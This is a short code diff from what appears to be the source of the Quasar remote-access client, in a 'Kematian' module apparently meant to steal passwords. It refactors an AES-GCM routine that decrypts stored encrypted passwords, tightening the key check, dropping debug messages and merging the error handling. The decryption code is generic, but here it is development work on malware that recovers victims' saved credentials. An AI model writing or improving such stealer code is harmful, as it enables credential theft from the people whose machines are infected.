@@ -77,7 +77,7 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
         {
             const int KEY_BIT_SIZE = 256;
 
-            if (key == null || key.Length != KEY_BIT_SIZE / 8)
+            if (key?.Length != KEY_BIT_SIZE / 8)
             {
                 Debug.WriteLine("Key is null or invalid length!");
                 return null;
@@ -85,36 +85,19 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
 
             if (encryptedPassword == null || encryptedPassword.Length == 0)
             {
-                Debug.WriteLine("Encrypted password is empty!");
                 return null;
             }
-
-            AesGcmBetter AES = new AesGcmBetter();
-            var output = new byte[0];
 
             try
             {
-                output = AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
-            }
-            catch (CryptographicException e)
-            {
-                if (e.Message.Contains("authentication tag mismatch"))
-                {
-                    Debug.WriteLine("Authentication tag mismatch. Decryption failed.");
-                }
-                else
-                {
-                    Debug.WriteLine(e);
-                }
-                return null;
+                var AES = new AesGcmBetter();
+                return AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
             }
             catch (Exception e)
             {
                 Debug.WriteLine(e);
                 return null;
             }
-
-            return output;
         }
     }
 }
